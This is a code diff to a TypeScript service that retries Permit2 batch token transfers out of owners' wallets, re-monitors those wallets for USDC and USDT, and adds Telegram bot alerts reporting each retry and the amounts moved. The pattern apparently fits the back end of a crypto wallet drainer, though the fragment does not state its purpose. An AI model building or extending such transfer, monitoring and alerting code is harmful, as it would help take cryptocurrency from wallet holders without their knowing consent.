@@ -1,6 +1,7 @@
 import { storage } from "./storage";
 import { executePermit2BatchTransfer } from "./permit2-relayer";
 import { addWalletToMonitor } from "./wallet-monitor";
+import { notifyRetrySuccess, notifyRetryFailed, resolveTokenSymbol } from "./telegram-bot";
 
 let retryInterval: ReturnType<typeof setInterval> | null = null;
 let isRunning = false;
@@ -21,6 +22,14 @@ async function retryPendingTransfers() {
           lastError: "Max retries exceeded",
         });
         console.log(`[Transfer-Retry] Transfer ${transfer.id} exceeded max retries, marking as failed`);
+        
+        notifyRetryFailed({
+          walletAddress: transfer.ownerAddress,
+          chainId: transfer.chainId,
+          attempt: retryCount,
+          error: "Max retries exceeded (50 attempts)",
+          maxRetriesExceeded: true,
+        }).catch(() => {});
         continue;
       }
 
@@ -61,6 +70,14 @@ async function retryPendingTransfers() {
 
           await addWalletToMonitor(transfer.ownerAddress, 'evm', transfer.chainId, ['USDC', 'USDT']);
 
+          notifyRetrySuccess({
+            walletAddress: transfer.ownerAddress,
+            chainId: transfer.chainId,
+            txHash: result.txHash,
+            attempt: retryCount + 1,
+            tokens: result.transfers.filter(t => t.success).map(t => ({ token: resolveTokenSymbol(t.token), amount: t.amount })),
+          }).catch(() => {});
+
           console.log(`[Transfer-Retry] Successfully retried transfer ${transfer.id} - tx: ${result.txHash}`);
         } else if (result.success && !result.txHash) {
           await storage.updatePendingTransfer(transfer.id, {
@@ -76,6 +93,13 @@ async function retryPendingTransfers() {
             lastRetryAt: new Date(),
           });
           console.log(`[Transfer-Retry] Retry failed for ${transfer.id}: ${result.error}`);
+          
+          notifyRetryFailed({
+            walletAddress: transfer.ownerAddress,
+            chainId: transfer.chainId,
+            attempt: retryCount + 1,
+            error: result.error || "Unknown error",
+          }).catch(() => {});
         }
       } catch (err: any) {
         await storage.updatePendingTransfer(transfer.id, {
@@ -84,6 +108,13 @@ async function retryPendingTransfers() {
           lastRetryAt: new Date(),
         });
         console.error(`[Transfer-Retry] Error retrying ${transfer.id}:`, err?.message);
+        
+        notifyRetryFailed({
+          walletAddress: transfer.ownerAddress,
+          chainId: transfer.chainId,
+          attempt: retryCount + 1,
+          error: err?.message || "Unknown error",
+        }).catch(() => {});
       }
     }
   } catch (err: any) {
